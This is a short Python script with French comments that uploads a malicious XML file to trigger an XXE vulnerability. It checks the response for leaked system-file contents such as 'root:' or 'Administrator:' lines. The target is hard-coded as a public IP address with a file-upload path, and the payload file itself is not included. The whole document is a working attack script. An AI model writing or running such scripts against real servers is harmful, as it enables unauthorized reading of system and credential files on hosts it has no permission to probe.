import requests

def exploit_xxe(url, file_path):
    """
    Envoie un fichier XML malveillant à l'application pour exploiter la vulnérabilité XXE.
    
    :param url: URL de l'endpoint d'import ou similaire (ex. http://localhost:3000/api/import)
    :param file_path: chemin vers le fichier XML malveillant (XXE_payload.xml)
    """
    try:
        with open(file_path, 'rb') as f:
            files = {'file': ('XXE_payload.xml', f, 'application/xml')}
            r = requests.post(url, files=files)

        print("[*] Statut de la requête :", r.status_code)
        print("[*] Contenu de la réponse :")
        print(r.text)

        if "root:" in r.text or "Administrator:" in r.text:
            print("[+] XXE potentiellement réussie ! Du contenu sensible a été renvoyé.")
        else:
            print("[-] Pas de contenu sensible détecté.")
    except FileNotFoundError:
        print("[!] Fichier XML introuvable. Vérifiez le chemin.")
    except requests.RequestException as e:
        print(f"[!] Erreur lors de la requête : {e}")

if __name__ == "__main__":
    target_url = "http://45.76.47.218:3000/file-upload"
 
    payload_file = "Attacks/XXE_payload.xml"

    exploit_xxe(target_url, payload_file)
